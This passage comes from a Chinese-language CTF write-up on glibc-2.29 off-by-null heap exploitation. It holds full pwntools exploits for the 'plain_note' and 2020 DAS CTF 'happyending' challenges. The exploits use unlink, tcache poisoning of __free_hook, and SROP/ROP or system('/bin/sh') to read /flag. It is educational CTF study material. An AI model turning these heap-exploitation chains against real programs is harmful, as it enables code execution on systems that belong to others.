def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./plain_note")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./plain_note")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def creat(sh,chunk_size,value):
    sh.recvuntil('Choice: ')
    sh.sendline('1')
    sh.recvuntil('Size: ')
    sh.sendline(str(chunk_size))
    sh.recvuntil('Content: ')
    sh.send(value)

def delete(sh,index):
    sh.recvuntil('Choice: ')
    sh.sendline('2')
    sh.recvuntil('Idx: ')
    sh.sendline(str(index))

def show(sh,index):
    sh.recvuntil('Choice: ')
    sh.sendline('3')
    sh.recvuntil('Idx: ')
    sh.sendline(str(index))


def Attack():
    # Your Code here
    while True:
        sh = get_sh()

        # Clean Bins
        for i in range(7 + 11):
            creat(sh, 0x18 , 'Clean' + 'n')
        for i in range(7 + 3):
            creat(sh, 0x38 , 'Clean' + 'n')
        for i in range(7 + 9):
            creat(sh, 0x68 , 'Clean' + 'n')
        for i in range(7 + 2):
            creat(sh, 0x78 , 'Clean' + 'n')
        for i in range(5):
            creat(sh, 0xC8 , 'Clean' + 'n')
        for i in range(6):
            creat(sh, 0xE8 , 'Clean' + 'n')

        # Make unlink

        for i in range(7):
            creat(sh, 0x28 , 'chunk_' + str(64 + i) + 'n')
        creat(sh, 0xBF8 , 'pad' + 'n')
        # creat(sh, 0x18  , 'Test' + 'n')

        creat(sh, 0x5E0 , 'chunk_72' + 'n') 
        creat(sh, 0x18  , 'chunk_73' + 'n')
        delete(sh,72)
        creat(sh, 0x618 , 'chunk_72' + 'n')

        creat(sh, 0x28  , 'a' * 8 + p64(0xe1) + p8(0x90))

        creat(sh, 0x28  , 'chunk_75' + 'n')
        creat(sh, 0x28  , 'chunk_76' + 'n')
        creat(sh, 0x28  , 'chunk_77' + 'n')
        creat(sh, 0x28  , 'chunk_78' + 'n')

        for i in range(7):
            delete(sh, i + 64)

        delete(sh, 75)
        delete(sh, 77)

        for i in range(7):
            creat(sh, 0x28 , 'chunk_' + str(64 + i) + 'n')

        creat(sh, 0x618 , 'chunk_75' + 'n')

        creat(sh, 0x28  , 'b' * 8 + p8(0x10))
        creat(sh, 0x28  , 'chunk_1')

        for i in range(7):
            delete(sh, i + 64)

        delete(sh, 78)
        delete(sh, 74)

        for i in range(7):
            creat(sh, 0x28 , 'chunk_' + str(64+i) + 'n')

        creat(sh, 0x28  , p8(0x10))
        creat(sh, 0x28  , 'c' * 0x20 + p64(0xe0))

        creat(sh, 0x4F8  , 'n')
        delete(sh, 80)

        try:
            #Leak info
            creat(sh, 0x18 , 'n')
            show(sh,79)
            libc.address = get_address(sh=sh,info='LIBC_ADDRESS --&gt; ',start_string='',end_string='n',offset=0x7f30e85f4000-0x7f30e87d8ca0)

            creat(sh, 0x38 , 'n')
            delete(sh, 18)
            delete(sh, 81)
            show(sh,79)
            heap_address = get_address(sh=sh,info='HEAP_ADDRESS --&gt; ',start_string='',end_string='n',offset=-0x1270)

            creat(sh, 0x18 , 'n')
            delete(sh, 18)
            delete(sh, 76)
            creat(sh, 0x28, p64(0) + p64(0x31)  + p64(libc.symbols['__free_hook']))
            creat(sh, 0x18 , 'n')
            creat(sh, 0x18 , p64(libc.address+0x000000000012be97))

            # SROP chain
            frame = SigreturnFrame()
            frame.rdi = heap_address + 0x30A0 + 0x100 + 0x100
            frame.rsi = 0
            frame.rdx = 0x100
            frame.rsp = heap_address + 0x30a0 + 0x100
            frame.rip = libc.address + 0x000000000002535f # : ret
            frame.set_regvalue('&amp;fpstate', heap_address)
            str_frame = str(frame)

            payload = p64(libc.symbols['setcontext'] + 0x1d) + p64(heap_address + 0x30A0) + str_frame[0x10:]

            # ROP chain
            layout = [
                # sys_open("./flag", 0)
                libc.address + 0x0000000000047cf8, #: pop rax; ret; 
                2,
                libc.address + 0x00000000000cf6c5, #: syscall; ret; 
                # sys_read(flag_fd, heap, 0x100)
                libc.address + 0x0000000000026542, #: pop rdi; ret; 
                3, # maybe it is 2
                libc.address + 0x0000000000026f9e, #: pop rsi; ret; 
                heap_address + 0x10000,
                libc.address + 0x000000000012bda6, #: pop rdx; ret; 
                0x100,
                libc.address + 0x0000000000047cf8, #: pop rax; ret; 
                0,
                libc.address + 0x00000000000cf6c5, #: syscall; ret; 
                # sys_write(1, heap, 0x100)
                libc.address + 0x0000000000026542, #: pop rdi; ret; 
                1,
                libc.address + 0x0000000000026f9e, #: pop rsi; ret; 
                heap_address + 0x10000,
                libc.address + 0x000000000012bda6, #: pop rdx; ret; 
                0x100,
                libc.address + 0x0000000000047cf8, #: pop rax; ret; 
                1,
                libc.address + 0x00000000000cf6c5, #: syscall; ret; 
                # exit(0)
                libc.address + 0x0000000000026542, #: pop rdi; ret; 
                0,
                libc.address + 0x0000000000047cf8, #: pop rax; ret; 
                231,
                libc.address + 0x00000000000cf6c5, #: syscall; ret; 
            ]
            payload = payload.ljust(0x100, '') + flat(layout)
            payload = payload.ljust(0x200, '') + '/flag'

            creat(sh, 0x300, payload)

            info(str(hex(libc.symbols['setcontext'] + 0x1d)))
            delete(sh,82)

            flag = sh.recvall(0.3)
            # sh.interactive()
            sh.close()
            return flag
        except EOFError:
            sh.close()
            continue



if __name__ == "__main__":
        flag = Attack()
        log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```



## 0x06 以 2020 DAS CTF MAY PWN happyending 为例

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-062224.png)

保护全开，64位程序，Glibc-2.29

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-062347.png)

创建新`Chunk`时，存在`Off-by-null`。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

这个题的利用甚至比上一题要简单，因为没有开启沙箱

#### <a class="reference-link" name="%E6%9E%84%E9%80%A0%E5%A0%86%E5%B8%83%E5%B1%80%EF%BC%8C%E8%A7%A6%E5%8F%91unlink"></a>构造堆布局，触发unlink

还是和之前一样，申请用于填满`Tcache`的`chunk`，然后申请探测`chunk`，根据探测结果申请填充`chunk`。

```
for i in range(7):
    creat(sh, 0x28 , 'chunk_' + str(i) + 'n')
for i in range(7):
    creat(sh, 0x18 , 'chunk_' + str(i) + 'n')
for i in range(7):
    creat(sh, 0x38 , 'chunk_' + str(i) + 'n')
creat(sh, 0x9B8 , 'pad' + 'n')
creat(sh, 0x18  , 'Test' + 'n')
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-063625.png)

接下来的构造与上一题基本完全相同，本题不再赘述。

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

happyending=ELF('./happyending', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./happyending")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./happyending")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def creat(sh,chunk_size,value):
    sh.recvuntil('&gt;')
    sh.sendline('1')
    sh.recvuntil('Your blessing words length :')
    sh.sendline(str(chunk_size))
    sh.recvuntil('Best wishes to them!')
    sh.send(value)

def delete(sh,index):
    sh.recvuntil('&gt;')
    sh.sendline('2')
    sh.recvuntil('input the idx to clean the debuff :')
    sh.sendline(str(index))

def show(sh,index):
    sh.recvuntil('&gt;')
    sh.sendline('3')
    sh.recvuntil('input the idx to show your blessing :')
    sh.sendline(str(index))


def Attack(sh=None,ip=None,port=None):
    while True:
        sh = get_sh()
        # Make unlink
        for i in range(7):
            creat(sh, 0x28 , 'chunk_' + str(i) + 'n')
        for i in range(7):
            creat(sh, 0x18 , '/bin/shx00' + 'n')
        for i in range(7):
            creat(sh, 0x38 , '/bin/shx00' + 'n')
        creat(sh, 0x9B8 , 'pad' + 'n')
        # creat(sh, 0x18  , 'Test' + 'n')

        creat(sh, 0x5E0 , 'chunk_22' + 'n') 
        creat(sh, 0x18  , 'chunk_23' + 'n')
        delete(sh,22)
        creat(sh, 0x618 , 'chunk_22' + 'n')

        creat(sh, 0x28  , 'a' * 8 + p64(0xe1) + p8(0x90))

        creat(sh, 0x28  , 'chunk_25' + 'n')
        creat(sh, 0x28  , 'chunk_26' + 'n')
        creat(sh, 0x28  , 'chunk_27' + 'n')
        creat(sh, 0x28  , 'chunk_28' + 'n')

        for i in range(7):
            delete(sh, i)

        delete(sh, 25)
        delete(sh, 27)

        for i in range(7):
            creat(sh, 0x28 , 'chunk_' + str(i) + 'n')

        creat(sh, 0x618 , 'chunk_25' + 'n')

        creat(sh, 0x28  , 'b' * 8 + p8(0x10))
        creat(sh, 0x28  , 'chunk_1')

        for i in range(7):
            delete(sh, i)

        delete(sh, 28)
        delete(sh, 24)

        for i in range(7):
            creat(sh, 0x28 , 'chunk_' + str(i) + 'n')

        creat(sh, 0x28  , p8(0x10))
        creat(sh, 0x28  , 'c' * 0x20 + p64(0xe0))

        creat(sh, 0x4F8  , 'n')
        delete(sh, 30)

        try:
            # Leak info
            creat(sh, 0x18 , 'n')
            show(sh,29)
            libc.address = get_address(sh=sh,info='LIBC_ADDRESS --&gt; ',start_string='n',end_string='1.',offset=0x00007f3e3d454000-0x7f3e3d638ca0)

            creat(sh, 0x38 , 'n')
            delete(sh, 18)
            delete(sh, 31)
            show(sh,29)
            heap_address = get_address(sh=sh,info='HEAP_ADDRESS --&gt; ',start_string='n',end_string='1.',offset=-0x590)

            creat(sh, 0x18 , 'n')
            delete(sh, 18)
            delete(sh, 26)
            creat(sh, 0x28, p64(0) + p64(0x31)  + p64(libc.symbols['__free_hook']))
            creat(sh, 0x18 , 'n')
            creat(sh, 0x18 , p64(libc.symbols['system']))

            delete(sh,8)

            flag = get_flag(sh)
            # get_gdb(sh,stop=True)
            # sh.interactive()
            sh.close()
            return flag
        except EOFError:
            sh.close()
            continue

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-12-071430.png)



## 0x07 参考链接

[【转】Linux下堆漏洞利用(off-by-one) – intfre](https://blog.csdn.net/nibiru_holmes/article/details/62040763)

[【原】Glibc堆块的向前向后合并与unlink原理机制探究 – Bug制造机](https://bbs.ichunqiu.com/thread-46614-1-1.html)

[【原】glibc2.29-off by one – AiDai](https://aidaip.github.io/binary/2020/02/19/glibc2.29-off-by-one.html)

[【原】Balsn CTF 2019 pwn PlainText — glibc-2.29 off by one pypass – Ex](http://blog.eonew.cn/archives/1233)
